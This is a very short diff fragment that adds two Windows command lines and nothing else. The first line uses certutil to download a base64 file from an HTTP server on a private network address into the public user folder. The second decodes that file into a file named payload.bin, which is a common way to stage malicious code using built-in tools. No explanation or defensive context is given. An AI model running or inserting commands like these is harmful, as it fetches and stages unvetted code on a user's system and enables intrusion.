@@ -1,0 +1,2 @@
+certutil -urlcache -split -f http://192.168.1.13:8000/archive.b64 C:\Users\Public\out.b64
+certutil -decode C:\Users\Public\out.b64 C:\Users\Public\payload.bin
